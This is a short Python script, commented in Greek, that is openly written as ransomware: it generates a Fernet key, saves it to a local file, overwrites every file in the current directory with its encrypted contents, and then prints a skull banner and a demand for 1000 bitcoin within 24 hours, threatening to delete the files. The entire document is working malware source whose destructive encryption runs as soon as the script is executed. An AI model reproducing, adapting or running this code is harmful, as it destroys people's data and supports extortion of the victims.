import os
from cryptography.fernet import Fernet 



files = [] #Creat a list 
 

for file in os.listdir(): # Επιστρεφη ολα τα αρχεια
    if file in ["malware_Encryption.py", "theKey.Key", "malware_Decryption.py","malware_main.py"]: # Ελεγχος αν τα αρχεια αυτα ειναι το malware.py
        continue 
    if os.path.isfile(file): ## Ελέγχος αν το τρέχον στοιχείο είναι αρχείο και όχι φάκελος.
        files.append(file)

#print(files,"\n")

Key = Fernet.generate_key() # Δημιουργία κλειδιου αποθηκευονατασ στην μεταβλητη Key

with open ("theKey.Key","wb") as theKey:
    theKey.write(Key)

for file in files:
    with open(file,"rb") as thefile: ## Ανοιγουμε τα αρχεια 
        conteiner = thefile.read() # Αποθηκευση των αρχειων και το κανουμε read
    conteiner_encryption = Fernet(Key).encrypt(conteiner) ## Κανουνε κρυπτογραφιση τα αερχεια και τα αποθηκευουμε 
    with open(file,"wb") as thefile: 
        thefile.write(conteiner_encryption) 


b = """

             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$*   *$$$*   *$$$$$$u
       *$$$$*      u$u       $$$$*
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         *$$$$uu$$$   $$$uu$$$$*
          *$$$$$$$*   *$$$$$$$*
            u$$$$$$$u$$$$$$$u
             u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$       $$$$$u$u$u$$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$**
     $$$*                         $$$$*


"""

print(b)
print(" HAHAHAHAHAHAHHA all your files is encrypt. You mast give my a 1000 bittcoin in 24 hours \n")

print("Otherwise, I will delete all your files.\n")


